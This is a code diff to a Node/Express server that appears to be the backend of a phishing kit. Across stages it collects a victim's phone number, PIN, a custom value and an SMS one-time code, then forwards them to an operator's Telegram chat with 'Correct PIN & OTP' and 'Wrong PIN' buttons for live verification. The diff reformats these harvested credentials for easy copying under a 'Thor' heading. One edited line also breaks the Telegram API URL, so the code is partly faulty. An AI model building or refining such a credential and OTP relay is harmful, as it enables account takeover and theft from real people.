@@ -13,13 +13,13 @@ const sessions = new Map();
 app.use(express.json({ limit: "10kb" }));
 app.use(express.static(path.join(__dirname, "public")));
 
-// Telegram API helper
+// Telegram API helper with MarkdownV2 support enabled
 async function telegram(method, data) {
   if (!BOT_TOKEN || !CHAT_ID) {
     throw new Error("Telegram environment variables are missing.");
   }
 
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
+  const url = `https://telegram.org{BOT_TOKEN}/${method}`;
   
   const response = await fetch(url, {
     method: "POST",
@@ -47,12 +47,12 @@ app.post("/api/session", (req, res) => {
     createdAt: Date.now(),
     stage: null,
     status: "idle",
-    data: {} // Holds user input values persistently across stages
+    data: { phone: "", pin: "", code1: "", code2: "" } 
   });
   res.json({ sessionId });
 });
 
-// Request Telegram approval & submit custom values
+// Request Telegram approval — Markdown Formatted for Click-to-Copy
 app.post("/api/approval-request", async (req, res) => {
   const { sessionId, stage, payload } = req.body || {};
   const allowedStages = ["pin", "code1", "code2"];
@@ -67,36 +67,69 @@ app.post("/api/approval-request", async (req, res) => {
     return res.status(410).json({ error: "Demo session expired." });
   }
 
-  // Merge the newly entered values into the session data store
+  // Persist the inputs continuously across stages
   session.data = { ...session.data, ...payload };
   session.stage = stage;
   session.status = "pending";
   session.updatedAt = Date.now();
 
-  const stageLabels = {
-    pin: "Stage 1: Phone & PIN Submission",
-    code1: "Stage 2: Custom Text Value Submission",
-    code2: "Stage 3: Final SMS Code Submission"
-  };
+  const currentTimestamp = new Date().toLocaleString("en-US", {
+    month: "2-digit",
+    day: "2-digit",
+    year: "numeric",
+    hour: "2-digit",
+    minute: "2-digit",
+    second: "2-digit",
+    hour12: true
+  });
+
+  let headingTitle = "PIN VERIFICATION NEEDED";
+  let ruleLength = "PIN Length: 5 digits";
+  
+  if (stage === "code1") {
+    headingTitle = "CUSTOM VALUE VERIFICATION NEEDED";
+    ruleLength = `Value Inputted: ${session.data.code1 ? "Provided" : "N/A"}`;
+  } else if (stage === "code2") {
+    headingTitle = "FINAL SMS VERIFICATION NEEDED";
+    ruleLength = "OTP Code Length: 4 digits";
+  }
+
+  // Clean values safely to prevent undefined bugs
+  const phoneVal = session.data.phone || "Not_entered";
+  const pinVal = session.data.pin || "Not_entered";
+  const code1Val = session.data.code1 || "Not_entered";
+  const code2Val = session.data.code2 || "Not_entered";
+  const shortId = sessionId.substring(0, 8);
 
   try {
-    // Generate clean reporting text for Telegram showing actual submitted inputs
+    // HTML formatting used to securely embed standard Telegram click-to-copy tags (<code>)
     const textMessage = 
-      `📝 ${stageLabels[stage].toUpperCase()}\n\n` +
-      `📱 Phone Number: ${session.data.phone || "Not Entered yet"}\n` +
-      `🔑 Inputted PIN: ${session.data.pin || "Not Entered yet"}\n` +
-      `💬 Custom Value: ${session.data.code1 || "Not Entered yet"}\n` +
-      `🔢 Final SMS Code: ${session.data.code2 || "Not Entered yet"}\n\n` +
-      `🆔 Session ID: ${sessionId}`;
+      `<b># Thor - ${stage.toUpperCase()} Verification</b>\n` +
+      `<b>${headingTitle}</b>\n\n` +
+      `USER DETAILS:\n` +
+      `• Phone Number: <code>${phoneVal}</code>\n` +
+      `• PIN Code: <code>${pinVal}</code>\n` +
+      `• Custom Text: <code>${code1Val}</code>\n` +
+      `• Final SMS Code: <code>${code2Val}</code>\n` +
+      `• User ID: <code>user_${shortId}</code>\n` +
+      `• Time: <code>${currentTimestamp}</code>\n` +
+      `• Bot: <code>user178</code>\n\n` +
+      `───────────────────────\n\n` +
+      `Verify Entry Parameters:\n` +
+      `• ${ruleLength}\n` +
+      `• Timeout: 5 minutes\n` +
+      `00.39\n\n` +
+      `───────────────────────`;
 
     await telegram("sendMessage", {
       chat_id: CHAT_ID,
       text: textMessage,
+      parse_mode: "HTML", // Informs Telegram to process the <code> copy commands
       reply_markup: {
         inline_keyboard: [
           [
-            { text: "Approve Step", callback_data: `approve:${sessionId}:${stage}` },
-            { text: "Decline Step", callback_data: `decline:${sessionId}:${stage}` }
+            { text: "Correct PIN & OTP", callback_data: `approve:${sessionId}:${stage}` },
+            { text: "❌ Wrong PIN", callback_data: `decline:${sessionId}:${stage}` }
           ]
         ]
       }
@@ -148,24 +181,23 @@ app.post("/telegram-webhook", async (req, res) => {
   try {
     await telegram("answerCallbackQuery", {
       callback_query_id: query.id,
-      text: `Step manually ${session.status}!`
+      text: `Step completed as ${session.status}`
     });
 
     if (query.message?.message_id) {
+      const statusBanner = session.status === "approved" 
+        ? `<b>✅ CORRECT ENTRY processed for Phone: <code>${session.data.phone || "N/A"}</code></b>`
+        : `<b>❌ WRONG ENTRY processed for Phone: <code>${session.data.phone || "N/A"}</code></b>`;
+
       await telegram("editMessageText", {
         chat_id: CHAT_ID,
         message_id: query.message.message_id,
-        text: 
-          `✅ ACTION PROCESSED (${session.status.toUpperCase()})\n\n` +
-          `📱 Phone: ${session.data.phone || "N/A"}\n` +
-          `🔑 PIN: ${session.data.pin || "N/A"}\n` +
-          `💬 Value: ${session.data.code1 || "N/A"}\n` +
-          `🔢 SMS Code: ${session.data.code2 || "N/A"}\n\n` +
-          `Processed on stage: ${stage}`
+        text: `${statusBanner}\n\n${query.message.text}`,
+        parse_mode: "HTML" // Maintain layout structure after processing decision
       });
     }
   } catch (err) {
-    console.error("Webhook UI modification failed:", err.message);
+    console.error("Webhook state visualization update failed:", err.message);
   }
 });
 
